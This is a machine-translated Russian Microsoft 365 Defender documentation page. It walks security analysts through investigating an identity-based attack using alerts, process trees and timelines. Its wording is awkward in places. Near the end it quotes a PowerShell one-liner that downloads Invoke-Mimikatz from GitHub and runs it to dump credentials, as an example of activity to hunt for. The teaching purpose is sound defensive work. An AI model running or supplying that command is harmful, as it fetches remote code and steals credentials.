---
title: Пример атаки на основе удостоверений
description: Проанализив пример атаки на основе удостоверений.
keywords: инциденты, оповещения, расследование, корреляция, атака, компьютеры, устройства, пользователи, удостоверения, удостоверения, почтовый ящик, электронная почта, 365, Microsoft, m365, реагирование на инциденты, кибератака
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: e56d6d5d78101da1f6da4c14ade25e80aa5b5063
ms.sourcegitcommit: 05f40904f8278f53643efa76a907968b5c662d9a
ms.translationtype: MT
ms.contentlocale: ru-RU
ms.lasthandoff: 04/30/2021
ms.locfileid: "52114856"
---
# <a name="example-of-an-identity-based-attack"></a>Пример атаки на основе удостоверений

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Область применения:**
- Microsoft 365 Defender

Microsoft Defender for Identity может помочь обнаружить вредоносные попытки компрометации удостоверений в организации. Так как Defender for Identity интегрируется с Microsoft 365 Defender, аналитики по безопасности могут иметь видимость угроз, исходяющих из Defender for Identity, таких как предполагаемые попытки повышения привилегий Netlogon.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Анализ атаки в Microsoft Defender для удостоверений

Microsoft 365 Defender позволяет аналитикам фильтровать оповещения с помощью источника обнаружения на вкладке **Оповещения** на странице инцидентов. В следующем примере источник обнаружения фильтруется в **Defender for Identity.** 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Пример фильтрации источника обнаружения для Defender для identity":::

Выбор оповещений о предполагаемой атаке **overpass-the-hash** отправляется на страницу в Microsoft Cloud App Security, которая отображает более подробные сведения. Вы всегда можете узнать больше об оповещении или атаке, выбрав дополнительные инструкции по этому типу оповещения, чтобы прочитать описание атаки, а также рекомендации по исправлению.  [](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002)
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Пример оповещений о предполагаемой атаке overpass-the-hash"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Исследование той же атаки в Microsoft Defender для конечной точки

Кроме того, аналитик может использовать Defender для конечной точки, чтобы узнать больше об активности на конечной точке. Выберите инцидент из очереди инцидента, а затем выберите **вкладку Оповещения.** Отсюда они также могут идентифицировать источник обнаружения. Источник обнаружения, помеченный как EDR, означает endpoint Detection and Response , который является Defender для конечной точки. Отсюда аналитик выбирает оповещение, обнаруженную EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Пример обнаружения и ответа конечной точки в Defender для конечной точки"::: 

На странице оповещений отображаются различные сведения, такие как имя устройства, имя пользователя, состояние автоматического расследования и сведения об оповещении. В этой истории оповещений повествуется визуальное представление дерева процесса. Дерево процесса представляет собой иерархическое представление родительских и детских процессов, связанных с оповещением.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Пример дерева обработки оповещений в Defender для конечной точки"::: 

Каждый процесс можно расширить, чтобы просмотреть дополнительные сведения. Сведения, которые может видеть аналитик, это фактические команды, которые были введены в составе вредоносного скрипта, IP-адресов исходящие подключения и другие полезные сведения.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Пример сведений о процессе в Defender для конечной точки":::
 
Выбрав график См. в **графике,** аналитик может еще больше сверлить, чтобы определить точное время компромисса. 

Microsoft Defender для конечной точки может обнаруживать множество вредоносных файлов и скриптов. Однако из-за множества законных применений для исходящие подключения, PowerShell и командной строки некоторые действия будут считаться доброкачественными, пока не создадут вредоносный файл или действие. Поэтому использование временной шкалы помогает аналитикам ввести оповещение в контекст с окружающими действиями, чтобы определить исходный источник или время атаки, которые в противном случае не заслонятся общей файловой системой и действиями пользователей. 

Для этого аналитик начнет во время обнаружения оповещений (красным цветом) и вовремя прокрутит вниз назад, чтобы определить, когда первоначальное действие, которое привело к вредоносной активности, на самом деле началось. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Пример запуска во время обнаружения оповещений"::: 

Важно понимать и различать общие действия, такие как подключения Windows Update, Windows доверенный трафик активации программного обеспечения, другие распространенные подключения к сайтам Майкрософт, сторонние действия в Интернете, Microsoft Endpoint Configuration Manager активности и другие доброкачественные действия от подозрительной активности. Один из способов добиться этого — использовать фильтры временной шкалы. Существует множество фильтров, которые могут выделить определенные действия, отфильтровывая все, что аналитик не хочет просматривать. 

На рисунке ниже аналитик фильтруется для просмотра только сетевых событий и процессов. Это позволяет аналитику видеть сетевые подключения и процессы, связанные с событием, Блокнот установлено подключение с IP-адресом, которое мы также видели в дереве процесса. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Пример использования Блокнот для подключения к вредоносным исходящие"::: 

В этом конкретном событии Блокнот для подключения к вредоносным исходящие. Однако часто злоумышленники просто iexplorer.exe для создания подключений для загрузки вредоносной полезной нагрузки, так как обычно iexplorer.exe обычно считаются обычными действиями веб-браузера.

Другим элементом, который следует искать в временной шкале, является использование PowerShell для исходящие подключения. Аналитик будет искать успешные подключения PowerShell с командами, такими как исходящие подключения к веб-сайту, на который размещен `IEX (New-Object Net.Webclient)` вредоносный файл. 

В следующем примере PowerShell использовалась для скачивания и выполнения Mimikatz с веб-сайта:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Аналитик может быстро искать ключевые слова, введя ключевое слово в панели поиска, чтобы отображать только события, созданные с помощью PowerShell. 

## <a name="next-step"></a>Следующий шаг

См. [путь к расследованию фишинга.](first-incident-path-phishing.md)

## <a name="see-also"></a>См. также

- [Обзор инцидентов](incidents-overview.md)
- [Управление инцидентами](manage-incidents.md)
- [Анализ инцидентов](investigate-incidents.md)
